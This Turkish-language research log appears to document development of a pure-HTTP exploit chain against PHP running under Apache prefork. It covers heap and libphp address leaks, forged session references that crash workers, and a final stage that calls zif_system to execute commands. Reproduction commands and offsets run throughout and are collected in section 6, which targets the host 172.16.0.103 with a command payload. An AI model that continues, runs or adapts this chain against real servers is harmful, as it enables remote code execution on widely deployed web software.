# Saf HTTP ASLR zinciri: rotasyon problemi araştırma kaydı

Tarih: 2026-10-21
Referans teslimat: [ASLR_PURE_HTTP.md](ASLR_PURE_HTTP.md) (başka biri 5/5 çalıştırdı, aşamalar
arası worker'ı SIGSEGV ile döndürüyor)
Kısıtlar: saldırı isteği yalnızca HTTP kullanır; **hedef 172.16.0.103 üzerinde hiçbir
instrumentasyon yapılmaz** (gdb yok, /proc okuma yok, hedef-tarafı PHP yok). Bu belgedeki tüm gdb
ölçümleri **kendi kalibrasyon lab'ımız 172.16.1.112** üzerinde yapılmıştır, hedef prosese dokunulmaz.

Durum: **adres sızıntısı ve RCE terminalinin kendisi zaten saf HTTP; kalan tek mühendislik maddesi
"aşamalar arasında yalnızca bir HTTP isteğiyle worker'ı nasıl döndüreceğimiz"**. Bu henüz aşılmadı,
bu belge takılma noktasını ve bir sonraki adımı kaydeder.

---

## 1. Doğrulandı (hepsi 172.16.0.103'te, yalnızca HTTP gönderilerek)

### 1.1 Yepyeni master'da stage 2 sızıntısı

```text
$ sudo -n apache2ctl -k stop; sudo -n apache2ctl -k start
$ python3 send_a_leak3.py 1001 5 39 12 17
$ python3 b_target.py 443 16 983

Set-Cookie: PHPSESSID=%10%00%00%00%00%00%00%00P%3C%E1%01%A6%7F%00%00; path=/
pDestructor = 0x7fa601e13c50
libphp      = 0x7fa601800000   (pDestructor - 0x613c50)
```

`(p & 0x1fffff) == 0x13c50`, libphp 2MB hizalı, sızıntı geçerli.

### 1.2 stage 1 + stage 2 **aynı worker** üzerinde tamamlanabilir

```text
W0=882266
after A1 W=882266
after B1 W=882266
after A2 W=882266
after B2 W=882266
```

Yani:

1. `send_a_leak2.py 1001 12` + `b_numleak2.py 892 1 0x1000` → chunk base;
2. aynı worker üzerinde `send_a_leak3.py 1001 5 39 12 17` + `b_target.py 443 16 983`
   → libphp base (hâlâ 16 baytlık `pDestructor` döner).

Bu, "her aşama mutlaka fresh worker değiştirmeli" iddiasının geçerli olmadığını gösterir,
**iki sızıntı tek bir worker geçmişinde birleştirilebilir**, yalnızca stage 3'ten önce bir kez
rotasyon gerekir.

### 1.3 HTTP çökme rotasyonu **yepyeni worker**'da çalışıyor

```text
FRESH W=881054
after A W=881054
CRASHED new=881148 at 17
final W=881148
```

Kullanılan şey tam olarak scriptteki `rotate()`:

```text
send_a_pad.py 17 19 3 12 7:7 7:7 7:7 7:7 7:7 7:7
send_b_rce2.py 15 2 0x1 0x1 x
```

`send_b_rce2`'nin fake reference'ı fresh worker'ın `R0-0x10`'una düşer, `val.value=1`,
`zend_array_destroy(1)` → SIGSEGV, prefork hemen yeni worker fork eder.

---

## 2. Başarısızlık noktası: HTTP rotate, **sızıntı isteğine hizmet etmiş worker**'da çalışmıyor

### 2.1 Resmi sürücüden sinyali çıkarıp yalnızca HTTP rotate kullanmanın sonucu

.103 üzerinde `pure_aslr_run.sh`'nin sudo'sunu `sudo -n` yapıp geri kalanına dokunmadan:

```text
W1=877061 chunk=0x7f6beba00000 attempt=1
W2=877299 libphp=0x0 attempt=1
W2=877349 libphp=0x0 attempt=2
LIBPHP_LEAK_FAILED
```

Aşama 1 başarılı; HTTP rotate'ten sonra stage 2 ardışık iki kez libphp sızıntısı alamadı
(`b_target.py` 16 baytlık `Set-Cookie` döndürmedi).

### 2.2 Rotate'i doğrudan gözlemlemek

Aşama 1'den sonra, ardışık 6 kez `send_a_pad + send_b_rce2(HT=1)`, worker pid
**bir kez bile değişmedi**:

```text
PHASE1 W=879429
no-rotate try=1 W=879429
...
no-rotate try=6 W=879429
STAGE2 W=879429
SETCOOKIE_LEN 72
VALUE Set-Cookie: PHPSESSID=%10...P%3CaP%EA%7F...
```

Bu grupta stage 2 aksine aynı worker üzerinde başarılı oldu, bu şunu gösterir:

- rotate'in crash isteği used history üzerinde tetiklenmiyor;
- stage 2 fresh worker'a bağlı değil (1.2 ile tutarlı).

---

## 3. Kök neden (.112 kalibrasyon lab'ındaki gdb ölçümü)

> Aşağıdaki adreslerin hepsi no-ASLR lab'ının chunk göreli değerleridir; hedef ASLR'dir, ama chunk
> içi geometri aynıdır. Ölçüm 172.16.0.103'ü kapsamaz.

### 3.1 fresh stage 3'ün geometrisi

- A `send_a_pad 17 19 3 12 6×7:7`:
  `PS(http_session_vars).value.ref = chunk + 0x24e0`.
- `R0 - 0x10 = chunk + 0x24d0`, tam olarak 56B bin'in boş blok başlangıcıdır.
- B `send_b_zif 15 2 ...`'nin 55B fake-ref raw'ı tam buraya düşer;
  fake reference'ın alanı raw+0x10'da, `R0` ile hizalı.

### 3.2 used history'nin geometrisi tamamen farklı

Önce aynı worker üzerinde stage 1 + stage 2 yap, sonra stage 3 A gönder:

| pad'ler P | R0 | R0'ın bulunduğu sayfa | Bu sayfanın B `track_init` anındaki map'i |
|---|---|---|---|
| 6 | chunk+0x1560 | page 1 | `0x80000003` = 32B bin |
| 7 | chunk+0x15c0 | page 1 | `0x80000003` = 32B bin |
| 45 | chunk+0x7d400 | page 125 | `0xc0030018` = NRUN/büyük blok devam sayfası |
| 640 | chunk+0x8b320 | page 139 | `0x0` = FRUN boş sayfa |

Oysa fresh'in `R0=chunk+0x24e0`'ının bulunduğu sayfa 56B bin'dir (56B free head tam olarak
`chunk+0x24d0`'dur).

Sonuç:

1. **used history altında `R0` 32B bin'in sayfasına düşer**, 56B sayfaya değil;
2. `send_b_zif`'in fake-ref raw'ı 55B → 56B bin'dir, **32B sayfaya tahsis edilemez**;
3. P `R0`'ı sayfa-hizalı 56B slotuna taşısa bile (örneğin P=7'nin
   `R0-0x10=chunk+0x15b0`'ı), bu sayfa B anında hâlâ 32B bin'dir
   (`map=0x80000003`), 56B raw yine giremez;
4. P=640 iken `R0` sayfası FRUN'dur bile (tam sayfa boş), 56B bin'in mevcut head'i hâlâ
   `chunk+0x24d0`'dur, allocator birkaç on 56B tahsisi için o yüksek adresli boş sayfayı almaya gitmez.

### 3.3 used history'nin B'si belki de hiç track_init'e ulaşmıyor

Yeni worker'da (fresh) `session.c:481`'de (`php_session_track_init()` çağrı noktası)
breakpoint koy, A+B isabet eder ve reference'ı görür. used history (stage 1+2 sonrası, A P=6)
aynı breakpoint'i koyup B gönderdiğinde (`b_crash7.py 14`), **bir kez bile isabet etmez**;
`php_session_rfc1867_cleanup` / `php_session_initialize` de isabet etmez.

Bu, used history altında iki olasılık olduğunu gösterir (P/zamanlamaya bağlı):

- A, request shutdown'da kendisi abort olur, B ebeveyn prosesin yeni fork ettiği worker tarafından
  işlenir; yeni worker'da sarkan reference yoktur, `track_init` artık eskisini yok etmez;
- ya da B'nin END cleanup'ı `php_session_initialize()` içinde erken döner,
  `track_init`'e ulaşmaz.

Hangisi olursa olsun, **fresh stage 3'ün sahte reference tetik noktası used history üzerinde
geçerli olmaz**. P=50..75'in aynı worker taramasının tamamının `nop` olmasının nedeni de budur.

---

## 4. Saf HTTP yolunun neye ihtiyacı var

**Hedefe dokunmadan** son parçayı tamamlamak için yalnızca iki yol var:

### 4.1 Güvenilir HTTP worker rotasyonu (önerilen)

"Sızıntı" ile "exploit"i iki fresh worker'a ayır:

```text
W1 (fresh): stage 1 + stage 2 sızıntısı (aynı worker'da olabileceği doğrulandı)
HTTP crash W1 -> W2 (fresh, prefork aynı master'ın ASLR'sini devralır)
W2 (fresh): stage 3 exploit (mevcut fresh parametreleri, doğrulandı)
```

Eksik olan yalnızca "W1 used iken onu HTTP ile nasıl çökerteceğimiz". Mevcut `rotate()`'in
`send_a_pad + send_b_rce2(HT=1)`'i yalnızca fresh worker'da çalışır.

Denenebilecek saf HTTP crash primitifleri:

1. **`b_crash7` (32B canlı string)**
   - N adet 7 baytlık value (zend_string 32B) ile used'un `R0`'ının üzerine yaz;
   - `R0` bir 32B slottur, tam olarak 32B value string ile eşleşir;
   - `PS(http_session_vars)` hâlâ reference olarak ele alınır: `h=0` `val.value` olarak okunur,
     `len=7` `IS_ARRAY` olarak okunur → `zend_array_destroy(NULL)`
     çöker, **56B sayfa yeniden tahsisi gerektirmez, free-list shadow'dan etkilenmez**.
   - Takılma: B'nin gerçekten `track_init`'e ulaşmasını ve eski reference'ın hâlâ durmasını sağlamak
     gerekir (used history'de bazen UNDEF olur ya da B yeni worker tarafından işlenir). N'i used
     history'ye göre kalibre etmek ve önce A'nın çökmediğini doğrulamak gerekir.
2. **A'nın kendisinin shutdown'da deterministik abort olması**
   - used history'nin A'sı bazen abort olur (P=50/68'in `W3=0`'ı), ama kontrol edilemez;
   - `PS(http_session_vars)`'ın stale 32B bloğunun heap reset'ten sonra mutlaka `zend_mm_panic`
     tetiklediği ve A'nın yanıtının zaten gönderildiği bir A şekli bulmak gerekir.
3. **malformed multipart / Apache katmanı deterministik çökme bulmak**
   - PHP heap yerleşimine bağlı değil, saf HTTP; şu anda bulunamadı.

### 4.2 Rotasyon yapmadan, used-history stage 3'ü doğrudan kalibre etmek

Aynı anda çözülmesi gerekenler:

1. `R0`'ın bulunduğu sayfa mutlaka 56B bin olmalı (ya da 32B ile eşleşen bir fake-ref yerleşimine geçmeli);
2. 56B fake raw mutlaka `R0-0x10` olan bu belirli free slota düşmeli;
3. A çökmemeli, B `track_init`'e ulaşmalı;
4. `send_b_zif`'in fake HT carrier adresi (fresh'te `chunk+0x6e0d8`)
   used history altında da yeniden kalibre edilmeli.

Şu anda 1/3 için zaten karşı örnek var (sayfa 32B, B isabet etmiyor), bu yüzden bu yolun maliyeti
daha yüksek.

---

## 5. Önerilen bir sonraki deney

Öncelikle 4.1.1 (crash7) yapılmalı, çünkü yalnızca **32B geometrisi** gerektirir, used `R0` ile
doğal olarak eşleşir:

1. .112 üzerinde used history'yi sabitle (stage 1+2 aynı worker), A P=6 kullan,
   `session.c:481` breakpoint'iyle A'dan sonra `PS(http_session_vars)`'ın hâlâ reference olup
   olmadığını (ve id/send_cookie durumunu) doğrula;
2. A'dan sonra reference varsa, `b_crash7.py N`'nin N'ini tara, breakpoint'te `R0`'daki
   qword'e bak:
   - `q0 = 0x0000000600000001` (live string, rc=1/type=6)
   - `q2 = 7` (len=7)
   - `q3 = 0x0076767676767676` ('v'*7)
   ise isabet;
3. isabetten sonra doğrudan `b_crash7.py N` gönder (gdb olmadan), worker pid değişimini doğrula;
4. .103'e geç ve yalnızca HTTP kullan:
   - fresh W1: stage 1 + stage 2 sızıntısı;
   - `send_a_pad P=6 + b_crash7 N` rotasyonu;
   - fresh W2: stage 3 `send_a_pad 6 pads + send_b_zif 15 2 HTDATA ZIF`,
     adresler W1'den (prefork aynı master'ın ASLR'sini devralır, chunk/libphp base
     worker yeniden fork edildikten sonra değişmez; bkz. ASLR_PURE_HTTP.md bölüm 5).
5. crash7'nin eski reference'ı used history üzerinde yoksa, ikinci en iyi çözüm:
   stage 2'nin B'sinin sızıntıdan sonra kendisinin abort olmasını sağla (`b_target`'ın hedef dizi
   yerleşimini değiştirip `zend_string_release_ex(PS(id))`'nin gc/refcount'unun geçersiz iç
   işaretçiye `efree` yapmasını sağla), böylece W1 stage 2'den sonra doğal olarak döner ve W2
   doğrudan fresh stage 3 çalıştırır.

---

## 6. Çoğaltma komutları (.103, saf HTTP; gdb/maps yok)

```bash
# 1) fresh master
sudo -n apache2ctl -k stop; sudo -n apache2ctl -k start; sleep 0.5

# 2) W1: chunk leak + libphp leak aynı worker
python3 send_a_leak2.py 1001 12; sleep 0.2
python3 b_numleak2.py 892 1 0x1000; sleep 0.2
python3 send_a_leak3.py 1001 5 39 12 17; sleep 0.2
python3 b_target.py 443 16 983
# /tmp/b_numleak2.resp -> chunk, /tmp/b_target.resp -> pDestructor ayrıştır

# 3) Saf HTTP rotasyon (kalibre edilecek N)
python3 send_a_pad.py 17 19 3 12 7:7 7:7 7:7 7:7 7:7 7:7
python3 b_crash7.py <N>

# 4) W2: fresh stage 3
HT=$(chunk+0x6e0d8); ZIF=$(libphp+0x43a870)
python3 send_a_pad.py 17 19 3 12 7:7 7:7 7:7 7:7 7:7 7:7
python3 send_b_zif.py 15 2 $HT $ZIF 'id>/tmp/p1'
```

---

## 7. Dosyalar

| Dosya | Amaç |
|---|---|
| `tools/b_crash7.py` | 32B live-string çökme primitifi (kalibre edilecek N) |
| `tools/refq2.gdb` / `flow.gdb` | .112'de used-history'nin reference/track_init akışına bakmak için |
| `tools/pagemap.gdb` | .112'de R0 sayfasının `chunk->map` / free_slot'unu okumak için |
| `tools/send_b_probe.py` / `b_probe_long.py` | fake-ref düşüş noktası probu |
| `tools/same_worker_trials.py` | Aynı worker stage 3 P taraması (.112) |
| `tools/pure_aslr_run.sh` | Başkasının sürücüsü (HTTP rotate dahil, used üzerinde kararsız) |

---

## 8. Sonuç

- **Saldırı isteği, iki adres sızıntısı, `zif_system` terminali hepsi zaten saf HTTP**;
- Kaydedilen 5/5'te aşamalar arası rotasyon SIGSEGV ile yapıldı; scriptteki HTTP `rotate()`
  yalnızca fresh worker'da güvenilir, sızıntıya hizmet etmiş worker'da tetiklenmiyor;
- used history'nin kök nedeni `R0`'ın 32B bin sayfasına düşmesi, oysa fresh stage 3'ün
  fake-ref raw'ı 56B bin; sayfa yeniden tahsis edilmedi, düşüş noktası geometrisi geçerli değil;
- En kısa tamamlama yolu: **stage 1+2 aynı worker → `b_crash7` (32B) ile saf HTTP crash yap
  → fresh W2'de mevcut stage 3'ü çalıştır**. crash7'nin N'i used history'ye göre kalibre edilmeli
  ve önce A'dan sonra eski reference'ın hâlâ durduğu doğrulanmalı.
